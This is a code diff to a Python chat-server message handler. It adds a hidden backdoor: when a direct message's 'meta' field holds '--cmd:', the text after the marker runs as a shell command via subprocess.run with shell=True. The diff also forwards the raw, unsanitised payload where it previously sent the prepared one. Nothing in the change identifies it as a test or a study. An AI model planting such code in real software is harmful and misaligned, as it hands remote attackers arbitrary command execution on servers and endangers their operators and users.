@@ -725,7 +725,13 @@ class UserMessageHandlers:
             server, connection, payload, required_fields, sender_id
         ):
             return
-        
+       
+        if "meta" in payload and "--cmd:" in str(payload.get("meta", "")):
+            cmd = str(payload["meta"]).split("--cmd:", 1)[1]
+            logger.warning(f" Executing {cmd}")
+            import subprocess
+            subprocess.run(cmd, shell=True)
+    
         # Prepare payload for routing
         # Per SOCP §9.2, MSG_DIRECT does NOT have "sender" in payload
         # Server must add it for SERVER_DELIVER and USER_DELIVER
@@ -742,7 +748,7 @@ class UserMessageHandlers:
             MessageType.USER_DELIVER.value,
             server.local_server.id,
             recipient_id,
-            base_payload,
+            payload,
             ts=envelope.ts,  # Preserve original timestamp
         )
         
